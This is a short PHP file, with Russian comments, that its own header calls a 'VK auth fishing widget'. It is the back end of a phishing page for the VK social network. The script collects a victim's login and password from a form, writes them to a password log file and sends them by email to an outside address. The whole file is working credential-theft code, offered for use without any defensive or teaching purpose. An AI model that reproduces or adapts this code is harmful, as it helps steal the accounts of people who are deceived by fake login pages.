<?php
/*
 * @author: d32ds3c (ADM1N)
 * @name: VK auth fishing widget
 * @spcl: https://vk.com/bite_owl
 */

//Подключаем файл с классом
include("save.class.php");

//Получаем нужные нам данные
$email = trim($_POST["phone"]);
$pass = trim($_POST["pass"]);

//Создаём экземпляр класса
$save = new SaveMeNow($email, $pass);

//вызываем метод сохранения данных в файл и отправки их на e-mail
$save->Save("files/passlog.txt"/*File path/name*/, "test@gmail.com"/*E-mail to send*/);
?>